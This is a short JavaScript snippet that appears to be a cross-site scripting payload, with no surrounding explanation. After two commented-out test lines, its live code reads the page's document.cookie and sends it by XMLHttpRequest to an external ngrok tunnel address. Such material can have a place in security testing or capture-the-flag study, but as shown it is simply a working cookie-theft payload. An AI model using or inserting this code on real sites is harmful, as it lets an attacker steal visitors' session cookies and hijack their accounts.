//alert("XSS");
//document.write(document.cookie)

var request = new XMLHttpRequest();
request.open('GET', 'http://f966-90-173-214-195.ngrok-free.app/?cookie=' + document.cookie);
request.send();